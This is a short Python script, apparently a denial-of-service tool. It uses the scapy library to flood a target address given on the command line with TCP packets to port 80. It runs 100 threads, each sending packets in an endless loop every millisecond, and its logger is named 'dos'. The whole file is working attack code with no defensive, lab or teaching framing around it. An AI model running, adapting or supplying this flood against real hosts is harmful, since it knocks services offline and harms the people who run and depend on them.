from scapy.all import *
import threading
import sys
import logging

logger = logging.getLogger("dos")
logger.setLevel(logging.INFO)
stream_handler = logging.StreamHandler()
logger.addHandler(stream_handler)

dst_addr = ""
dst_port = 80
if len(sys.argv) > 1:
    dst_addr = sys.argv[1]

def run():
   IP1 = IP(dst=dst_addr)
   TCP1 = TCP(sport = 80, dport = dst_port)
   pkt = IP1 / TCP1
   send(pkt, loop=1, inter = .001)
for i in range(100):
   t = threading.Thread(target=run)
   t.start()
